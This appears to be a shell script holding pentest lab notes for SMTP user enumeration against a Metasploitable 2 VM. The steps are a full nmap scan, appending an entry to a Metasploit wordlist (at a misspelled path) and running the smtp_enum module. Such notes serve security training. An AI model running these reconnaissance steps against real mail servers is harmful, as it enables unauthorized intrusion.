echo '
--] SMTP ENUM 33

OPERATOR   === KALI               IP === 132
CHARLIE    === METASPLOITE 2      IP === 131
TANGO      === WIN 7              IP === 134
OSCAR      === WIN 10             IP === 133


OPERATOR    ==> TASK ==> sudo su << for to be root
OPERATOR    ==> TASK ==> nmap -p- -sV IP_CHARLIE
OPERATOR    ==> TASK ==> echo "Aa123456" >> /usr/share/metasploit-framwork/data/wordlists/unix_users.txt

OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> use auxiliary/scanner/smtp/smtp_enum
OPERATOR    ==> TASK ==> show options 
OPERATOR    ==> TASK ==> set rhosts IP_CHARLIE
OPERATOR    ==> TASK ==> set threads 3
OPERATOR    ==> TASK ==> run






'
read